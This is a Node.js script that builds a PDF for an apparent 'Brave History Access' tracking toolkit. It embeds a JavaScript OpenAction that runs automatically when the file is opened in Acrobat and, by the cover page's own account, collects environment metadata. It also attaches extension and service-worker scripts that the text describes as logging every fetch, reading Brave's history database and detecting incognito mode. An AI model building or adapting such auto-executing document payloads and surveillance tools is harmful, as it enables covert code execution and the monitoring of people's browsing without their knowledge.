/**
 * generate-pdf.js
 * ─────────────────────────────────────────────────────────────────
 * Node.js script that builds a PDF containing:
 *   1. A visible cover page explaining the tool
 *   2. An embedded JavaScript action that executes on open (Adobe Acrobat)
 *   3. The original JS files as embedded file attachments
 *
 * Usage:
 *   node generate-pdf.js                      → outputs brave-history-access.pdf
 *   node generate-pdf.js my-output.pdf        → custom filename
 *
 * Dependencies: pdf-lib
 *
 * @version 1.0.0
 */

const fs = require('fs');
const path = require('path');
const { PDFDocument, PDFName, PDFString, PDFArray, PDFDict, PDFHexString, StandardFonts, rgb } = require('pdf-lib');

// ─── Configuration ──────────────────────────────────────────────────

const OUTPUT_FILE = process.argv[2] || 'brave-history-access.pdf';

const FILES_TO_ATTACH = [
    { path: 'brave-history-access.js', desc: 'Main browser script (v2)' },
    { path: 'history-sw.js',           desc: 'Service Worker (v2)' },
    { path: 'pdf-payload.js',          desc: 'PDF-adapted payload' },
    { path: 'README.md',               desc: 'Documentation' },
];

// ─── Helpers ────────────────────────────────────────────────────────

function readLocalFile(filePath) {
    const absolute = path.resolve(__dirname, filePath);
    return fs.readFileSync(absolute);
}

function timestamp() {
    return new Date().toISOString().replace('T', ' ').slice(0, 19);
}

// ─── PDF Generation ─────────────────────────────────────────────────

async function generatePDF() {
    console.log(`[generate-pdf] Starting PDF generation...`);

    const pdfDoc = await PDFDocument.create();

    // ── Metadata ────────────────────────────────────────────────────
    pdfDoc.setTitle('Brave Browser History Access Tool');
    pdfDoc.setAuthor('BraveHistoryAccess');
    pdfDoc.setSubject('Browser history access and tracking utility');
    pdfDoc.setKeywords(['brave', 'history', 'browser', 'incognito', 'tracking']);
    pdfDoc.setProducer('generate-pdf.js v1.0.0');
    pdfDoc.setCreator('BraveHistoryAccess PDF Generator');
    pdfDoc.setCreationDate(new Date());
    pdfDoc.setModificationDate(new Date());

    // ── Fonts ───────────────────────────────────────────────────────
    const helvetica = await pdfDoc.embedFont(StandardFonts.Helvetica);
    const helveticaBold = await pdfDoc.embedFont(StandardFonts.HelveticaBold);
    const courier = await pdfDoc.embedFont(StandardFonts.Courier);

    // ── Page 1 — Cover ──────────────────────────────────────────────
    const page1 = pdfDoc.addPage([612, 792]);   // US Letter
    const { width, height } = page1.getSize();

    // Background header band
    page1.drawRectangle({
        x: 0, y: height - 120,
        width, height: 120,
        color: rgb(0.13, 0.13, 0.17)
    });

    page1.drawText('BRAVE HISTORY ACCESS', {
        x: 50, y: height - 60,
        size: 28,
        font: helveticaBold,
        color: rgb(1, 0.6, 0.2)       // Brave orange
    });

    page1.drawText('Browser History Access & Tracking Tool - v2.0', {
        x: 50, y: height - 90,
        size: 12,
        font: helvetica,
        color: rgb(0.8, 0.8, 0.85)
    });

    page1.drawText(`Generated: ${timestamp()}`, {
        x: 50, y: height - 108,
        size: 9,
        font: courier,
        color: rgb(0.5, 0.5, 0.55)
    });

    // ── Body text ───────────────────────────────────────────────────
    const bodyLines = [
        { text: 'About This Document', size: 16, font: helveticaBold, gap: 40 },
        { text: 'This PDF contains the Brave Browser History Access toolkit.', size: 11, font: helvetica, gap: 20 },
        { text: 'When opened in Adobe Acrobat or Acrobat Reader, an embedded', size: 11, font: helvetica, gap: 16 },
        { text: 'JavaScript payload will execute automatically, collecting', size: 11, font: helvetica, gap: 16 },
        { text: 'environment metadata and offering to launch the full tool.', size: 11, font: helvetica, gap: 16 },
        { text: '', size: 11, font: helvetica, gap: 12 },
        { text: 'Embedded Files', size: 16, font: helveticaBold, gap: 30 },
        { text: '- brave-history-access.js  -- Main browser script (v2)', size: 10, font: courier, gap: 16 },
        { text: '- history-sw.js            -- Service Worker (v2)', size: 10, font: courier, gap: 16 },
        { text: '- pdf-payload.js           -- Acrobat-adapted payload', size: 10, font: courier, gap: 16 },
        { text: '- README.md                -- Full documentation', size: 10, font: courier, gap: 16 },
        { text: '', size: 11, font: helvetica, gap: 12 },
        { text: 'How to Use', size: 16, font: helveticaBold, gap: 30 },
        { text: '1. Open this PDF in Adobe Acrobat / Reader.', size: 11, font: helvetica, gap: 18 },
        { text: '2. Allow JavaScript execution when prompted.', size: 11, font: helvetica, gap: 18 },
        { text: '3. The payload runs automatically on open.', size: 11, font: helvetica, gap: 18 },
        { text: '4. Extract attached JS files from the sidebar', size: 11, font: helvetica, gap: 18 },
        { text: '   (View > Navigation Panels > Attachments).', size: 11, font: helvetica, gap: 18 },
        { text: '5. Load the extracted files as a Brave extension', size: 11, font: helvetica, gap: 18 },
        { text: '   or serve them via a local web server.', size: 11, font: helvetica, gap: 18 },
        { text: '', size: 11, font: helvetica, gap: 12 },
        { text: 'Security Notice', size: 16, font: helveticaBold, gap: 30 },
        { text: 'This tool is for educational and personal use only.', size: 11, font: helvetica, gap: 18 },
        { text: 'Do not use it to monitor others without consent.', size: 11, font: helvetica, gap: 18 },
        { text: 'Incognito history is not persistently accessible by design.', size: 11, font: helvetica, gap: 18 },
    ];

    let cursorY = height - 160;
    for (const line of bodyLines) {
        page1.drawText(line.text, {
            x: 50,
            y: cursorY,
            size: line.size,
            font: line.font,
            color: rgb(0.15, 0.15, 0.15)
        });
        cursorY -= line.gap;
    }

    // Footer
    page1.drawRectangle({
        x: 0, y: 0,
        width, height: 30,
        color: rgb(0.13, 0.13, 0.17)
    });
    page1.drawText('Brave History Access - Confidential', {
        x: 50, y: 10,
        size: 8,
        font: helvetica,
        color: rgb(0.5, 0.5, 0.55)
    });

    // ── Page 2 — Technical Details ──────────────────────────────────
    const page2 = pdfDoc.addPage([612, 792]);

    page2.drawRectangle({
        x: 0, y: height - 60,
        width, height: 60,
        color: rgb(0.13, 0.13, 0.17)
    });

    page2.drawText('TECHNICAL REFERENCE', {
        x: 50, y: height - 42,
        size: 20,
        font: helveticaBold,
        color: rgb(1, 0.6, 0.2)
    });

    const techLines = [
        { text: 'Methods Implemented', size: 14, font: helveticaBold, gap: 30 },
        { text: '1. Chrome Extension History API', size: 11, font: helveticaBold, gap: 20 },
        { text: '   Full history access via Brave extension permissions.', size: 10, font: helvetica, gap: 16 },
        { text: '2. Browser History API', size: 11, font: helveticaBold, gap: 20 },
        { text: '   Standard window.history -- current page, referrer, length.', size: 10, font: helvetica, gap: 16 },
        { text: '3. Local Storage Tracking', size: 11, font: helveticaBold, gap: 20 },
        { text: '   Appends visited pages to localStorage for continuous tracking.', size: 10, font: helvetica, gap: 16 },
        { text: '4. Service Worker Interception', size: 11, font: helveticaBold, gap: 20 },
        { text: '   Intercepts all fetch requests for comprehensive logging.', size: 10, font: helvetica, gap: 16 },
        { text: '5. File System Access API', size: 11, font: helveticaBold, gap: 20 },
        { text: '   Experimental direct access to Brave SQLite database.', size: 10, font: helvetica, gap: 16 },
        { text: '6. Incognito Detection + Session History', size: 11, font: helveticaBold, gap: 20 },
        { text: '   Multi-heuristic incognito detection with session data.', size: 10, font: helvetica, gap: 16 },
        { text: '', size: 10, font: helvetica, gap: 12 },
        { text: 'Extension manifest.json', size: 14, font: helveticaBold, gap: 30 },
        { text: '{', size: 9, font: courier, gap: 14 },
        { text: '  "manifest_version": 3,', size: 9, font: courier, gap: 14 },
        { text: '  "name": "Brave History Access",', size: 9, font: courier, gap: 14 },
        { text: '  "version": "2.0",', size: 9, font: courier, gap: 14 },
        { text: '  "permissions": ["history","activeTab","storage"],', size: 9, font: courier, gap: 14 },
        { text: '  "background": {"service_worker":"history-sw.js"},', size: 9, font: courier, gap: 14 },
        { text: '  "content_scripts": [{', size: 9, font: courier, gap: 14 },
        { text: '    "matches": ["<all_urls>"],', size: 9, font: helvetica, gap: 14 },
        { text: '    "js": ["brave-history-access.js"]', size: 9, font: courier, gap: 14 },
        { text: '  }]', size: 9, font: courier, gap: 14 },
        { text: '}', size: 9, font: courier, gap: 14 },
    ];

    cursorY = height - 100;
    for (const line of techLines) {
        page2.drawText(line.text, {
            x: 50,
            y: cursorY,
            size: line.size,
            font: line.font,
            color: rgb(0.15, 0.15, 0.15)
        });
        cursorY -= line.gap;
    }

    // Footer
    page2.drawRectangle({ x: 0, y: 0, width, height: 30, color: rgb(0.13, 0.13, 0.17) });
    page2.drawText('Brave History Access - Confidential', {
        x: 50, y: 10, size: 8, font: helvetica, color: rgb(0.5, 0.5, 0.55)
    });

    // ── Embed file attachments ──────────────────────────────────────
    for (const fileInfo of FILES_TO_ATTACH) {
        try {
            const content = readLocalFile(fileInfo.path);
            await pdfDoc.attach(content, fileInfo.path, {
                mimeType: fileInfo.path.endsWith('.js')
                    ? 'application/javascript'
                    : 'text/markdown',
                description: fileInfo.desc,
                creationDate: new Date(),
                modificationDate: new Date(),
            });
            console.log(`  ✓ Attached: ${fileInfo.path}`);
        } catch (err) {
            console.warn(`  ✗ Could not attach ${fileInfo.path}: ${err.message}`);
        }
    }

    // ── Embed JavaScript OpenAction ─────────────────────────────────
    try {
        const payloadSource = readLocalFile('pdf-payload.js').toString('utf-8');

        // Create the JavaScript action dictionary
        const context = pdfDoc.context;
        const jsActionDict = context.obj({
            Type: 'Action',
            S:    'JavaScript',
            JS:   PDFHexString.fromText(payloadSource),
        });

        const jsActionRef = context.register(jsActionDict);

        // Set as the document's OpenAction
        pdfDoc.catalog.set(PDFName.of('OpenAction'), jsActionRef);

        console.log('  ✓ Embedded JavaScript OpenAction');
    } catch (err) {
        console.warn(`  ✗ Could not embed JS action: ${err.message}`);
    }

    // ── Write PDF ───────────────────────────────────────────────────
    const pdfBytes = await pdfDoc.save();
    const outputPath = path.resolve(__dirname, OUTPUT_FILE);
    fs.writeFileSync(outputPath, pdfBytes);

    const sizeKB = (pdfBytes.length / 1024).toFixed(1);
    console.log(`\n[generate-pdf] ✓ PDF written to: ${outputPath}`);
    console.log(`[generate-pdf]   Size: ${sizeKB} KB  |  Pages: ${pdfDoc.getPageCount()}`);
    console.log(`[generate-pdf]   Attachments: ${FILES_TO_ATTACH.length}`);
    console.log(`[generate-pdf]   JavaScript: OpenAction embedded\n`);
}

// ─── Run ────────────────────────────────────────────────────────────

generatePDF().catch((err) => {
    console.error('[generate-pdf] Fatal error:', err);
    process.exit(1);
});
